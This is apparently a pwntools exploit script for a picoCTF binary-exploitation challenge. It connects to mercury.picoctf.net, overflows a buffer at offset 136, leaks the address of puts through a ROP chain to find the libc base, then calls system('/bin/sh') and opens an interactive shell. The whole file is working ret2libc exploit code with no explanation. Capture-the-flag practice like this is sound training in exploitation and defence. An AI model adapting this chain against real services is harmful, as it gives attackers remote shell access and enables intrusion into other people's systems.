from pwn import *

p = remote("mercury.picoctf.net", 1774)
elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")

rop = ROP(elf)

offset = 136
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"a"*offset + p64(pop_rdi) +p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

p.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)

p.recvline()
p.recvline()
addr = u64(p.recvline().rstrip().ljust(8, b'\x00'))
log.info(f"ADDR {hex(addr)}")
libc.address = addr - 0x80a30
log.info(f"LIBC {hex(libc.address)}")

payload = b"a"*offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
p.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)
p.interactive()
